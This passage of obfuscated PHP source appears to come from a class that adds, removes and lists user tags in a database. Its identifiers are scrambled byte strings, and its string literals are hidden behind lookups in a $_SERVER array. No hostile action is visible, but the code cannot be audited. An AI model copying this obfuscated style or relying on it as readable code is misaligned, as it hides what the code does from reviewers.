$aã¬×ëçÉù[436] => array($aã¬×ëçÉù[2208], 0)); $aóéË‡Ö‰ = $aã¬×ëçÉù[2210]; $eåŒê–“í× = $this->field($aóéË‡Ö‰)->where($c†„Ë¤®÷)->order($aã¬×ëçÉù[2211])->select(); return $eåŒê–“í× ? $eåŒê–“í× : array(); } protected function listByTag($dÛ¯ŸÍ ä½) { } protected function addToTag($BãÕâ™ö£, $CŠ¨¤Ü´—¦) { $cÅáøß¯¯§ =& $_SERVER[Å¸ş]; if (!Model($cÅáøß¯¯§[2346])->listData($CŠ¨¤Ü´—¦) || !Model($cÅáøß¯¯§[755])->pathInfo($BãÕâ™ö£)) { return !1; } $Có§»§…‰ = array($cÅáøß¯¯§[1427] => USER_ID, $cÅáøß¯¯§[436] => $CŠ¨¤Ü´—¦, $cÅáøß¯¯§[387] => $BãÕâ™ö£, $cÅáøß¯¯§[388] => $cÅáøß¯¯§[382], $cÅáøß¯¯§[386] => $cÅáøß¯¯§[33], $cÅáøß¯¯§[2112] => 0); if ($this->where($Có§»§…‰)->find()) { return !1; } return $this->add($Có§»§…‰); } protected function removeFromTag($a“ï¤¦©Á, $AÅŞƒÔ…ÂŸ) { $añ‹š—®„Ö =& $_SERVER[Å¸ş]; if (!Model($añ‹š—®„Ö[2346])->listData($AÅŞƒÔ…ÂŸ)) { return !1; } if (is_array($a“ï¤¦©Á)) { $a“ï¤¦©Á = array($añ‹š—®„Ö[7], $a“ï¤¦©Á); } $fšŠ†ÓÑÆ = array($añ‹š—®„Ö[1427] => USER_ID, $añ‹š—®„Ö[436] => $AÅŞƒÔ…ÂŸ, $añ‹š—®„Ö[388] => $añ‹š—®„Ö[382], $añ‹š—®„Ö[387] => $a“ï¤¦©Á); return $this->where($fšŠ†ÓÑÆ)->delete(); } protected function removeByTag($AÈ›­„‹Û¼) { $dŒŞ×¶‘ùó =& $_SERVER[Å¸ş]; if (!$AÈ›­„‹Û¼) { return !1; } $C†ÖËÀ½‰ = array($dŒŞ×¶‘ùó[1427] => USER_ID, $dŒŞ×¶‘ùó[436] => $AÈ›­„‹Û¼); return $this->where($C†ÖËÀ½‰)->delete(); } protected function removeBySource($a¼Ñ‰Ş†’†) { $A ÃõÓ½ê =& $_SERVER[Å¸ş]; if (is_array($a¼Ñ‰Ş†’†)) { $a¼Ñ‰Ş†’† = array($A ÃõÓ½ê[7], $a¼Ñ‰Ş†’†); } $EÇÁƒÂËù = array($A ÃõÓ½ê[1427] => USER_ID, $A ÃõÓ½ê[387] => $a¼Ñ‰Ş†’†, $A ÃõÓ½ê[436] => array($A ÃõÓ½ê[925], 0)); return $this->where($EÇÁƒÂËù)->delete(); } }